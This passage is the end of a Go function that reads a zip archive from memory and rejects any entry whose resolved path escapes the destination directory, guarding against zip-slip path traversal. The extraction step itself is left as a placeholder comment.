    zr, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
    if err != nil {
        return err
    }
    for _, f := range zr.File {
        target := filepath.Join(destAbs, f.Name)
        clean, err := filepath.Abs(filepath.Clean(target))
        if err != nil {
            return err
        }
        rel, err := filepath.Rel(destAbs, clean)
        if err != nil || strings.HasPrefix(rel, "..") {
            return fmt.Errorf("zip slip detected")
        }
        // extract f to clean with size limits
    }
    return nil
}
```

